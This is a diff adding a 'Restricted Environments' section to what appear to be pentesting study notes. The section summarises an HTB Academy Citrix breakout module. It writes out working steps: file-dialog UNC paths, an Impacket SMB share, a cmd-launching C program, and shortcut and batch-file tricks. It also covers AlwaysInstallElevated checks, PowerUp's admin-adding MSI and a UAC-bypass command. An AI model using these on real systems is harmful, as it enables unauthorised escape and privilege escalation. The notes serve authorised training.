@@ -28,6 +28,8 @@
 19. [VHD, VHDX, and VMDK Mounting](#19-vhd-vhdx-and-vmdk-mounting)
 20. [Windows Exploit Suggester](#20-windows-exploit-suggester)
 21. [Placeholder Reference](#21-placeholder-reference)
+22. [Quick Workflow](#22-quick-reference)
+23. [Restricted Environments](#23-restricted-environments)
 
 ---
 
@@ -1744,3 +1746,233 @@ Potential escalation path:
 Commands run:
 Evidence:
 ```
+
+# 23. Restricted Environments
+
+## 23.1 Citrix Breakout
+
+### Overview
+
+Restricted desktop environments are common in **Citrix**, **Terminal Services/RDS**, **AWS AppStream**, **CyberArk PSM**, and kiosk deployments. Organisations use policy restrictions to prevent users from launching administrative tools, browsing sensitive directories, or executing arbitrary programs.
+
+A **Citrix breakout** occurs when a user escapes these application/desktop restrictions and gains access to functionality that the environment was intended to block. A successful breakout does **not** automatically mean administrative access: privilege escalation is a separate step.
+
+**Typical assessment workflow:**
+
+1. Identify an accessible application or Windows **file dialog**.
+2. Use the dialog or another permitted interaction to reach restricted paths or launch a process.
+3. Obtain a command prompt or more capable file manager.
+4. Enumerate the host and check for local privilege-escalation weaknesses.
+5. Validate the effective privilege level after any elevation.
+
+> **Key concept:** A restriction enforced by the normal Windows Explorer interface may not be enforced by another application, a file dialog, or an alternative file manager. Conversely, actual filesystem permissions still apply.
+
+### 23.2 Bypassing Path Restrictions via File Dialogs
+
+Group Policy may block normal navigation to paths such as `C:\Users` or `C:\Windows\System32` in File Explorer. Many applications still expose **Open**, **Save As**, **Browse**, **Import/Export**, or **Print** dialogs.
+
+**HTB example using Paint:**
+
+1. Open **Paint** from the Start menu.
+2. Select **File → Open**.
+3. Set the file type to **All Files**.
+4. In **File name**, enter a UNC path to the local machine:
+
+```text
+\\127.0.0.1\c$\users\pmorgan
+```
+
+5. Press **Enter** to attempt to browse the target location.
+
+**Why it can work:** The application dialog may not apply the same Explorer navigation restriction. The `c$` component references Windows' administrative C-drive share; access still depends on SMB/share permissions and the environment's configuration.
+
+**Other dialog entry points:** Notepad, WordPad, Paint, and any application exposing file-selection dialogs.
+
+### 23.3 Accessing an SMB Share from a Restricted Desktop
+
+A file dialog may also be able to browse a remote SMB share when normal File Explorer navigation is blocked.
+
+On the **Linux assessment host**, serve the current working directory using Impacket:
+
+```bash
+smbserver.py -smb2support share "$(pwd)"
+```
+
+In the restricted desktop, open **Paint → File → Open**, change the filter to **All Files**, and supply the lab's SMB UNC path:
+
+```text
+\\10.13.38.95\share
+```
+
+The HTB example shows a remotely hosted executable being opened from the dialog, providing a command prompt. Direct file copying in the standard Explorer interface remained restricted; once a shell was available, command-line file transfer could be used.
+
+**Example launcher source (`pwn.c`) from the module:**
+
+```c
+#include <stdlib.h>
+
+int main(void) {
+    system("C:\\Windows\\System32\\cmd.exe");
+}
+```
+
+**Notes:**
+
+- The SMB address is **lab-specific**; replace it with the assessment host's address.
+- The module uses a precompiled `pwn.exe` corresponding to this source.
+- Access to the SMB share and whether executable launch is permitted both depend on the target's policies.
+
+### 23.4 Alternative File Managers
+
+If the Windows Explorer interface enforces navigation/copying restrictions, another file manager may behave differently.
+
+| Tool | Relevance |
+|---|---|
+| **Explorer++** | Portable file manager; the module demonstrates copying files from an SMB share to the user's Desktop. |
+| **Q-Dir** | Alternative file manager to test against Explorer-specific restrictions. |
+
+**Procedure:** Open a file dialog, navigate to the SMB share, launch an allowed portable file manager, and test whether it can browse or copy the files blocked in standard Explorer.
+
+> An alternative file manager does not inherently bypass NTFS ACLs or application allowlisting; the example is about restrictions on the standard Explorer interface.
+
+### 23.5 Alternative Registry Editors
+
+If **Registry Editor (`regedit.exe`)** is blocked by policy, third-party editors may offer an alternate GUI route to view or edit registry settings.
+
+Examples from the HTB module:
+
+- **SimpleRegEdit**
+- **UberRegEdit**
+- **SmallRegistryEditor**
+
+**Assessment point:** Determine whether blocking only `regedit.exe` adequately prevents registry changes. Actual registry permissions and application-control policy remain relevant.
+
+### 23.6 Modifying Windows Shortcuts (`.lnk`)
+
+An existing Windows shortcut can sometimes be repurposed to launch a restricted executable.
+
+1. Right-click an existing shortcut and select **Properties**.
+2. Change its **Target** to:
+
+```text
+C:\Windows\System32\cmd.exe
+```
+
+3. Execute the shortcut and check whether the command prompt opens.
+
+If an editable shortcut is not available, the module notes that one could be transferred using SMB or created separately.
+
+**Key point:** A shortcut can serve as an indirect executable-launch mechanism where ordinary navigation or Start Menu access is blocked.
+
+### 23.7 Script Execution
+
+Script file associations may enable a restricted user to invoke an interpreter through a file rather than through the Start Menu.
+
+The module's minimal batch-file example:
+
+**`evil.bat`**
+
+```bat
+cmd
+```
+
+Save and run the file to test whether the batch-file association starts Command Prompt.
+
+**Extensions mentioned by HTB:**
+
+- `.bat` — Windows batch scripts
+- `.vbs` — VBScript
+- `.ps` — as named in the source (PowerShell script files normally use `.ps1`)
+
+**Assessment point:** Check whether interpreters are actually controlled through execution policies and application allowlisting, rather than relying only on hidden shortcuts and blocked Explorer paths.
+
+### 23.8 Local Privilege Escalation: AlwaysInstallElevated
+
+After obtaining a shell, the module uses **PowerUp** (or suggests **winPEAS**) to identify Windows privilege-escalation weaknesses.
+
+The lab exposes an insecure Windows Installer policy: **AlwaysInstallElevated** is enabled under **both** the current-user and local-machine policy keys.
+
+Check both values:
+
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+**Vulnerable configuration shown in the module:**
+
+```text
+AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+Both keys being set to `1` means Windows Installer packages may run with elevated permissions, creating a local privilege-escalation risk.
+
+**HTB PowerUp workflow:**
+
+```powershell
+Import-Module .\PowerUp.ps1
+Write-UserAddMSI
+```
+
+This produces `UserAdd.msi`. In the lab, launching the installer allows creation of a local account in the **Administrators** group (the source demonstrates this with a lab-only example account).
+
+A command prompt can then be started under that account:
+
+```cmd
+runas /user:<new-local-user> cmd
+```
+
+> **Important:** Membership of the local Administrators group does not guarantee that every launched process has an elevated token. `runas` changes the account context; it is not, by itself, a UAC elevation mechanism.
+
+### 23.9 User Account Control (UAC)
+
+In the HTB scenario, a newly created local administrator still receives **Access is denied** when trying to enter `C:\Users\Administrator` from a non-elevated session.
+
+**Reason:** UAC can run processes belonging to administrators with a **filtered**, non-elevated access token. Some operations still require elevated privileges.
+
+The module demonstrates a PowerShell UAC-bypass module and a method named `UacMethodSysprep`:
+
+```powershell
+Import-Module .\Bypass-UAC.ps1
+Bypass-UAC -Method UacMethodSysprep
+```
+
+The walkthrough reports that the technique launches a higher-privileged PowerShell session. This is a **lab-specific demonstration**, not a guarantee that the method works on supported or hardened Windows versions.
+
+**Verify the actual token and privileges:**
+
+```cmd
+whoami /all
+whoami /priv
+```
+
+Confirm elevated group/token information and whether previously denied operations are now authorised.
+
+### 23.10 Quick Reference
+
+| Objective | Technique / Command |
+|---|---|
+| Reach a blocked path | Paint → File → Open → **All Files** → `\\127.0.0.1\c$\users\pmorgan` |
+| Host a lab SMB share | `smbserver.py -smb2support share "$(pwd)"` |
+| Browse remote SMB from dialog | `\\10.13.38.95\share` |
+| Launch a shell through a shortcut | Set `.lnk` Target to `C:\Windows\System32\cmd.exe` |
+| Test batch-file execution | `.bat` file containing `cmd` |
+| Use a different file browser | Explorer++ / Q-Dir |
+| Check installer policy (user) | `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
+| Check installer policy (machine) | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` |
+| Generate lab MSI with PowerUp | `Import-Module .\PowerUp.ps1` then `Write-UserAddMSI` |
+| Launch as another local user | `runas /user:<user> cmd` |
+| Inspect privileges | `whoami /all` and `whoami /priv` |
+
+### 23.11 Key Takeaways / Exam Reminders
+
+- **The core breakout chain:** dialog box → path/share access → command execution → local enumeration → privilege escalation.
+- **File dialogs are a common weak point** in desktops that restrict only Windows Explorer.
+- **UNC paths** may access local administrative shares or remote SMB shares from dialogs.
+- **Explorer++ and Q-Dir** can help distinguish Explorer-specific navigation restrictions from actual file permissions.
+- **Registry-editor alternatives, shortcut targets, and script associations** are additional execution or management paths to consider.
+- **AlwaysInstallElevated requires both HKCU and HKLM** values to be configured to create the described MSI elevation exposure.
+- **Administrator-group membership ≠ elevated process token.** Verify privileges and UAC state rather than assuming elevation succeeded.
+- Treat paths, addresses, accounts, and legacy UAC techniques in the HTB example as **lab-specific**, and only run breakout/elevation tests within authorised scope.
+
+**Source:** HTB Academy, *Citrix Breakout*, Module 67, Section 2502.
